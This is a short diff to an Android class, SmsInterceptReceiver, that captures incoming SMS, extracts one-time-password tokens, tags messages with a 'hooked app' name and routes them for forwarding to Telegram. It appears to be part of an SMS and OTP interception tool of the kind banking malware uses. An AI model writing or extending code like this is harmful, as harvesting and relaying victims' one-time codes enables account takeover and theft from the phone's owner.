@@ -22,7 +22,7 @@ class SmsInterceptReceiver : BroadcastReceiver() {
 
             val configManager = ConfigManager(context)
             val config = configManager.load()
-            if (!SmsMatcher.shouldCaptureIncoming(config, sender, body)) return
+            if (!SmsMatcher.shouldForwardToTelegram(config, sender, body)) return
 
             val interceptDisplay = SmsMatcher.interceptDisplay(config, sender, configManager)
             val token = SmsMatcher.extractToken(body, config.autoExtractOtp)
@@ -31,8 +31,9 @@ class SmsInterceptReceiver : BroadcastReceiver() {
                 sender = interceptDisplay,
                 body = body,
                 phone = interceptDisplay,
-                messageLabel = "",
-                direction = "incoming"
+                messageLabel = SmsMatcher.matchedHookedApp(config, sender, body)?.displayName.orEmpty(),
+                direction = "incoming",
+                rawPeer = sender
             )
             OtpCaptureWriter.write(context, otp)
             context.sendBroadcast(
